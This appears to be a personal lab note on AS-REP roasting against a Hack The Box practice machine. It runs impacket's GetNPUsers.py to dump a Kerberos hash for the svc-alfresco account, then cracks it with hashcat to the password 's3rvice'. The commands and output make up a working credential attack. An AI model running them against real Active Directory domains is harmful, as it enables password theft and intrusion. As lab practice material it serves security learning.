# Using GetNPUsers.py of impacket tool for [AS-REP Roasting](https://stealthbits.com/blog/cracking-active-directory-passwords-with-as-rep-roasting/) (to get TGT hash)
`GETNPUsers.py` is used to query target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking.
Using `GETNPUsers.py` to get TGT hash.
```bash
❯ python3 GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/' -format hashcat
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2021-07-27 13:38:11.210929  2019-09-23 16:09:47.931194  0x410200



$krb5asrep$23$svc-alfresco@HTB.LOCAL:4f60c362d3d5c16401891d90fade9548$4fbea99781491d2635b13948e0b6a0c949c125a480b3f41acb7191726d5e21cd3347b427ff0b9d72cf0d4f582bb4a60cf6f7ee6d39b69a43035e9376126de14e3a89906e6068f73f69adc3acdca591a194d907ef259373fe755b60e1a89ee183945e895c6a9a0f0cd015db45ca871eaf7ed98c2ad1b854fe9a9b92c950b25d50f83ad98b74f64e026f85c05152d5d98cde57480c2a5ba21ba80a648a0902fa91f9712715991fc35f73b343f8c698a1969934f6fa1b37ca4d7d875348b12e255a76d24a2341564b8580e961db3bb78fd01c78e87835af29a536e871b924cca3ee515bcf6376ba
```
# Cracking above hash via hashcat
Cracked above hash via hashcat.
```bash
❯ hashcat -m 18200  /home/kali/Dropbox/Documents/htb/boxes/RETIRED_BOXES/forest_retired/hash.hash  /home/kali/Dropbox/Documents/htb/boxes/compromised/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-4460  CPU @ 3.20GHz, 5712/5776 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Dictionary cache built:
* Filename..: /home/kali/Dropbox/Documents/htb/boxes/compromised/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 3 secs


$krb5asrep$23$svc-alfresco@HTB.LOCAL:4f60c362d3d5c16401891d90fade9548$4fbea99781491d2635b13948e0b6a0c949c125a480b3f41acb7191726d5e21cd3347b427ff0b9d72cf0d4f582bb4a60cf6f7ee6d39b69a43035e9376126de14e3a89906e6068f73f69adc3acdca591a194d907ef259373fe755b60e1a89ee183945e895c6a9a0f0cd015db45ca871eaf7ed98c2ad1b854fe9a9b92c950b25d50f83ad98b74f64e026f85c05152d5d98cde57480c2a5ba21ba80a648a0902fa91f9712715991fc35f73b343f8c698a1969934f6fa1b37ca4d7d875348b12e255a76d24a2341564b8580e961db3bb78fd01c78e87835af29a536e871b924cca3ee515bcf6376ba:s3rvice

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:4f60c362d3d5c1...6376ba
Time.Started.....: Tue Jul 27 13:43:49 2021 (8 secs)
Time.Estimated...: Tue Jul 27 13:43:57 2021 (0 secs)
Guess.Base.......: File (/home/kali/Dropbox/Documents/htb/boxes/compromised/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   515.9 kH/s (8.38ms) @ Accel:32 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4087808/14344385 (28.50%)
Rejected.........: 0/4087808 (0.00%)
Restore.Point....: 4079616/14344385 (28.44%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: s9039554h -> s2704081

Started: Tue Jul 27 13:43:24 2021
Stopped: Tue Jul 27 13:43:58 2021
```
![[Pasted image 20210727151229.png]]
